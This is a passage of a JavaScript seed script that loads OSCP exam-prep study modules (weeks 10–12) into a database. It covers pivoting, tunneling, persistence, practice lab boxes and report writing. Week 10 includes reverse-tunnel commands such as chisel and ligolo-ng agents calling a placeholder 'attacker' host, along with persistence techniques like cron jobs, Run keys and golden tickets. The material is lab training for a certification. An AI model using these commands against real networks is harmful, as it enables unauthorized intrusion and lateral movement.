- [ ] Day 5: end-to-end — fresh GOAD reset, go user → DA in under 4 hours`,
    resources_md: `- **680682846-Active-Directory-Attacks.pdf** — comprehensive (45 pages)
- **Active Directory Exploitation.pdf**, **Active Directory Pentesting.pdf**
- **Pwning the domain series - DACL Abuse.pdf** — every ACL primitive explained
- **AD Post Exploitation.pdf**, **Mimikatz Overview, Defenses and Detection.pdf**
- **Windows & Active Directory Exploitation Cheat Sheet.pdf** — exam-day reference
- **Attacking Active Directory with Linux.pdf** + the lab manual
- HackTricks Kerberos / NTLM Relay / ADCS pages`,
    lab_targets_md: `- HTB **Pro Labs**: \`Dante\`, \`Offshore\`, \`RastaLabs\` (when you can afford it)
- HTB AD-heavy: \`Sizzle\`, \`Mantis\`, \`Reel\`, \`Hathor\`, \`Forest\`, \`Sauna\`, \`Cascade\`, \`Resolute\`, \`Multimaster\`, \`Monteverde\`, \`Blackfield\`, \`Intelligence\`, \`APT\`, \`Atom\`, \`Object\`
- PG Practice: AD-tagged easy + medium boxes`,
  },

  {
    week_num: 10,
    title: 'Tunneling, pivoting, post-exploitation, persistence',
    goal: 'Move from foothold network to internal network and back. Understand persistence so the exam doesn\'t time you out on a cold-boot.',
    topics_md: `**SSH-based pivoting**
\`\`\`bash
ssh -L 8080:internal:80 user@jump        # local: localhost:8080 → internal:80
ssh -R 9001:localhost:9001 user@attacker # remote: expose attacker:9001 → me:9001
ssh -D 9050 user@jump                    # SOCKS proxy on localhost:9050
sshuttle -r user@jump 10.10.20.0/24      # transparent VPN-like proxy
proxychains4 -f /etc/proxychains.conf nmap ...   # use socks via proxychains
\`\`\`

**Chisel** (when SSH not available)
\`\`\`bash
# Attacker
chisel server -p 8000 --reverse
# Target (Linux/Windows)
chisel client attacker:8000 R:socks    # SOCKS proxy via reverse tunnel
\`\`\`

**Ligolo-ng** (modern, fast, TUN-based)
\`\`\`bash
# Attacker
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
sudo ip route add 10.10.20.0/24 dev ligolo
./proxy -selfcert
# Agent on compromised host
./agent -connect attacker:11601 -ignore-cert
\`\`\`

**Windows-native pivoting**
- \`netsh interface portproxy add v4tov4 listenport=8080 connectport=80 connectaddress=internal\`
- Plink reverse SSH from Windows
- \`socat\` for arbitrary forwarding

**Port-knocking, DNS tunneling**
- \`iodine\`, \`dnscat2\` — only when ICMP/TCP firewalled

**Post-exploitation: don't lose your shell**
- Background a working callback (msf/sliver session, or auto-respawning bash one-liner)
- Add SSH key for re-entry
- Note current TGT/cert in case you log out

**Persistence (light — exam doesn't reward heavy persistence)**
- \`crontab\`, \`/etc/crontab\`, systemd unit, .bashrc append
- Windows: scheduled task, Run-key, service
- Domain: skeleton key, golden ticket (only if you have krbtgt and want survivability across DC reboots)

**Cleanup mindset**
- Note every artifact you drop so you can describe it in the report
- Don't fork-bomb anything ever`,
    daily_tasks_md: `- [ ] Day 1: SSH local + remote + dynamic forwarding from memory
- [ ] Day 2: deploy chisel + proxychains, run nmap from your Kali through it
- [ ] Day 3: ligolo-ng setup end-to-end on a multi-network lab
- [ ] Day 4: post-exploitation drill — survive a reboot via cron + sshkey
- [ ] Day 5: full chain — perimeter web → DMZ pivot → internal AD via tunnel → DA`,
    resources_md: `- **Port Forwarding and Tunnelling Cheatsheet.pdf** — keep open during exam
- **Cloud Pentesting Cheatsheet.pdf** — for any cloud lateral
- HackTricks Pivoting & Tunneling
- ligolo-ng GitHub readme`,
    lab_targets_md: `- HTB \`Reel\`, \`Mantis\` (multi-host AD with pivoting needed)
- PG Practice: \`Internal\` (perimeter → AD)
- HTB Pro Lab \`Dante\` if budget allows`,
  },

  {
    week_num: 11,
    title: 'Practice gauntlet + first mock exam',
    goal: 'Build endurance. The exam is 24 hours; your first 24-hour run on randomly-picked boxes will tell you what falls apart.',
    topics_md: `**HTB / PG box rotation**
- Pick 3 standalone boxes per day, time-box 2h max each, then read the writeup if stuck.
- Mix 1 Linux + 1 Windows + 1 AD chain per day.
- After each box: write a 1-page mini-report (intro, scope, findings, exploitation steps with screenshots).

**Mock exam (1 full weekend)**
- Pick 1 AD set + 3 standalone boxes you haven't seen.
- Stick to exam rules: no MSF auto-exploits beyond the 1 allowed, no commercial tools, no cheat sheets you wouldn't have on exam day.
- 24h timer. Take 1-hour breaks. Eat. Sleep at least 6 hours.
- After: write the report in a separate 24h block.

**What to track during the gauntlet**
- Which step you got stuck on per box (pattern → weak topic).
- Time spent in each phase (recon / web / exploit / privesc).
- Cheat-sheet additions (techniques you had to look up — promote them to muscle memory).

**Note-taking discipline**
- Cherrytree, Obsidian, or just markdown folders — pick one, don't switch mid-prep.
- One folder per box: \`recon/\`, \`exploit/\`, \`loot/\`, \`screenshots/\`.
- Tag screenshots clearly (\`01-nmap.png\`, \`02-shell-www-data.png\`).
- Save EVERY command + output you'd need for the report.

**Common failure modes (and the fix)**
| Stuck on | Real cause | Fix |
|---|---|---|
| "I scanned and there's nothing" | Skipped UDP / didn't go full \`-p-\` | Always \`-p-\` then UDP top |
| "I have a shell but can't escalate" | Skipped basic enum | Re-run linpeas/winpeas from scratch |
| "I have a hash but can't crack" | Wrong mode | \`hashcat --identify\` |
| "I have AD creds but stuck" | Didn't run BloodHound | Always BloodHound first |
| "I'm out of time" | Sat on one box >2h | Move on, come back later |`,
    daily_tasks_md: `- [ ] Mon-Wed: 3 standalone boxes per day
- [ ] Thu: 1 AD chain
- [ ] Fri: review the week, identify 2 weakest topics, drill them
- [ ] Sat-Sun: full mock exam (24h hacking + 24h report)
- [ ] Sun pm: honest post-mortem — what would have failed on the real exam?`,
    resources_md: `- **HackTheBox Roadmap to Clear OSCP.pdf** — the box order
- **Offsec-PEN200-12 Weeks Plan.pdf** — official cadence
- **OSCP Challenge Lab - 0  Secura Writeup.pdf**, **OSCP Challenge Lab 1 - Medtech Complete Walkthrough.pdf** — exam-style lab walkthroughs
- TJ Null's OSCP-like list (Google "tj null oscp")`,
    lab_targets_md: `**Weekday rotation (pick from these):**
- Linux: \`Lame\`, \`Beep\`, \`Bashed\`, \`Shocker\`, \`Cronos\`, \`Nineveh\`, \`Sense\`, \`Solidstate\`, \`Kotarak\`, \`Node\`, \`Valentine\`, \`Poison\`, \`TartarSauce\`, \`Popcorn\`, \`Mirai\`, \`Haircut\`
- Windows: \`Legacy\`, \`Blue\`, \`Devel\`, \`Optimum\`, \`Bastard\`, \`Granny\`, \`Arctic\`, \`Grandpa\`, \`Silo\`, \`Bounty\`, \`Jerry\`, \`Jeeves\`, \`Chatterbox\`
- AD chain: \`Active\`, \`Forest\`, \`Sauna\`, \`Resolute\`, \`Cascade\`, \`Mantis\`, \`Reel\`, \`Sizzle\`, \`Monteverde\`, \`Blackfield\`, \`Intelligence\`, \`APT\``,
  },

  {
    week_num: 12,
    title: 'Reporting, exam strategy, final review',
    goal: 'Lock in the report template + exam-day procedure so the 48 hours of exam + report feels rehearsed, not improvised.',
    topics_md: `**Exam structure (OSCP+)**
- 24 hours of exam, 24 hours for report.
- Three standalone boxes (20 pts each, 60 total) + one AD set (40 pts: 10 per machine, all three needed).
- Pass: **70/100**. Bonus 10 from PG/lab work prior to exam.
- OSCP+ adds AD Set and removes the BoF block. Active retake policy.
- Allowed: any tool except commercial scanners and Metasploit (you may use MSF on **one** target only — per-attempt; manual modules are fine).
- No internet limits but no AI-assisted help during the exam.

**Exam-day procedure**
1. **Hour 0**: read all four briefs, decide your starting order (recommend AD set first if confident, otherwise easiest standalone).
2. **Hour 0-1**: enumerate every target in parallel — long nmap scans run while you read briefs.
3. **2-hour rule**: if you're spinning on a single target for 2h with no progress, **switch**. Coming back fresh works.
4. **Take screenshots constantly** — every successful command, every shell, every privesc step. \`flameshot\` or \`Greenshot\` with timestamps.
5. **Document creds + hosts + tickets** in real time — don't trust your memory.
6. **Eat real food**. Sleep at least 4 hours mid-exam if you've got 50pts and can afford it.
7. **Report buffer**: stop hacking at hour 22, even if you're close. You need 2 hours minimum to clean up evidence.

**The report**
- Use the OffSec template — exec summary → high-level walkthrough → per-finding (severity, impact, reproduction, mitigation) → appendix.
- **Write it like a real client report**, not a CTF writeup. Active voice past tense. No "we owned the box".
- Every command + output needs a screenshot or transcript.
- Include obtained credentials, dropped artifacts, persistence used.
- Spell-check. Read it once aloud before submitting.

**Common reporting mistakes**
- Missing screenshots of \`whoami\` or proof.txt content.
- Vague reproduction: "I exploited the SQLi" with no payload shown.
- Wrong severity (a recovered low-priv shell ≠ critical).
- Inconsistent terminology between findings.

**Final-week schedule**
- Mon-Wed: re-do your 3 weakest boxes from week 11.
- Thu: read your last full report and self-grade.
- Fri: rest. Don't touch anything.
- Sat: light review only — flashcards, your cheat sheet.
- Sun: more rest. Stretch. Sleep early.

**Mental ops**
- The exam is endurance, not brilliance. Methodical beats clever.
- Stuck → snack → walk → return. Don't grind cold.
- A 50-point afternoon is not a fail — many people pass with 70 exactly.`,
    daily_tasks_md: `- [ ] Day 1: read your week-11 mock report, list every weakness
- [ ] Day 2: redo the report with the OffSec template — clean version
- [ ] Day 3: build your "exam day cheat sheet" — only commands you'd actually need
- [ ] Day 4: light box (something you've already done) just to keep edges sharp
- [ ] Day 5-7: rest, hydrate, sleep. Schedule the exam.`,
    resources_md: `- **Writing an effective penetration testing report.pdf**
- **9 OSCP Study Tips to Help You Succeed By OffSec.pdf**
- **OffSec OSCP Exam with AD Preparation.pdf**
- OffSec official report template (Word + LaTeX)
- **OSCP Preparation Guide.pdf**, **OSCP Roadmap.pdf**, **Complete OSCP Guide 2024.pdf**`,
    lab_targets_md: `- One easy box of your choice for confidence
- Re-do your weakest week-11 box without notes`,
  },
];

const insert = db.prepare(`
  INSERT INTO cert_prep_modules (cert_id, week_num, title, goal, topics_md, daily_tasks_md, resources_md, lab_targets_md, position)
  VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
`);
const tx = db.transaction((rows) => {
  rows.forEach((m, i) =>
    insert.run(cert.id, m.week_num, m.title, m.goal, m.topics_md, m.daily_tasks_md, m.resources_md, m.lab_targets_md, i)
  );
});
tx(modules);

const total = db.prepare('SELECT COUNT(*) AS c FROM cert_prep_modules WHERE cert_id = ?').get(cert.id).c;
console.log(`Seeded ${total} OSCP modules.`);
